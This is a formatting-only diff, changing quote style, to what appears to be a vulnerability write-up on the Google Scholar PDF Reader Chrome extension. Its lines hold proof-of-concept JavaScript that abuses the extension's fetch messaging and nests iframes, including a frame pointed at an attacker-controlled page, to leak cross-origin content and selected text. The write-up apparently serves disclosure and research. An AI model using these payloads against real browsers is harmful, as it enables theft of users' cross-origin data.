@@ -13,9 +13,9 @@ Chrome Webstore: <https://chromewebstore.google.com/detail/google-scholar-pdf-re
 
 let x = chrome.runtime.connect();
 x.postMessage({
-  type: "fetch",
-  method: "GET",
-  url: "https://www.google.com/something.json",
+  type: 'fetch',
+  method: 'GET',
+  url: 'https://www.google.com/something.json',
   id: 1,
 });
 x.onMessage.addListener(console.log);
@@ -25,17 +25,17 @@ x.onMessage.addListener(console.log);
 
 ```js
 // Embed victim PDF from attacker page.
-let f = document.createElement("iframe");
+let f = document.createElement('iframe');
 f.width = 1000;
 f.height = 1000;
 f.src =
-  "https://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf";
+  'https://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf';
 document.body.appendChild(f);
 
 // Navigate nested, nested frame to attacker controlled page with null origin.
 // I think this also creates a race condition version
 f.contentWindow[0][0].location =
-  "https://terjanq.me/xss.php?h[Content-Security-Policy]=sandbox%20allow-scripts";
+  'https://terjanq.me/xss.php?h[Content-Security-Policy]=sandbox%20allow-scripts';
 
 // On that attacker page, Make sure the target page to leak is the same-origin as the pdf https://services.google.com in this case.
 onmessage = async (e) => {
@@ -44,19 +44,19 @@ onmessage = async (e) => {
   console.log(result.value);
 };
 parent.parent.postMessage(
-  { type: "fetch", url: "https://services.google.com/example" },
-  "*",
+  {type: 'fetch', url: 'https://services.google.com/example'},
+  '*',
 );
 ```
 
 # Leak 3 (Without compromised renderer)
 
 ```js
-let f = document.createElement("iframe");
+let f = document.createElement('iframe');
 f.width = 1000;
 f.height = 1000;
 f.src =
-  "https://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf";
+  'https://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf';
 document.body.appendChild(f);
 ```
 
@@ -64,7 +64,7 @@ Selected text gets leaked cross-origin.
 
 ```js
 onmessage = console.log;
-f.contentWindow[0].postMessage({ type: "getSelectedText" }, "*");
+f.contentWindow[0].postMessage({type: 'getSelectedText'}, '*');
 ```
 
 # Attack scenario
